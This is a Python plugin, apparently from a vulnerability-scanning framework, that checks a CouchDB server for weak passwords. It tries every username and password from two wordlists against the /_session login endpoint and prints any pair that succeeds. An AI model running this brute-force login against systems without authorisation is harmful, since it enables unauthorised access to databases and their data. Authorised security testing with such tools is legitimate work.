#!/usr/bin/env python3

import json
from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Couchdb_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CouchDB弱口令漏洞',
            'description': 'CouchDB弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        }

    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        url = self.url + "/_session"
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                data = {
                    'name': user,
                    'password': pwd
                    }
                try:
                    req = request.post(url, headers = self.headers, data = data)
                    if req.status_code == 200 and 'AuthSession' in req.headers['Set-Cookie'] and json.loads(req.text)['ok'] == True:
                        result = "user: %s pwd: %s" %(user, pwd)
                        print('存在CouchDB弱口令漏洞,弱口令为',result)
                        return True
                except Exception as e:
                    print(e)
        print('不存在CouchDB弱口令漏洞')
        return False
        
if __name__ == '__main__':
    Couchdb_Weakpwd = Couchdb_Weakpwd_BaseVerify('http://127.0.0.1:5984')
    Couchdb_Weakpwd.check()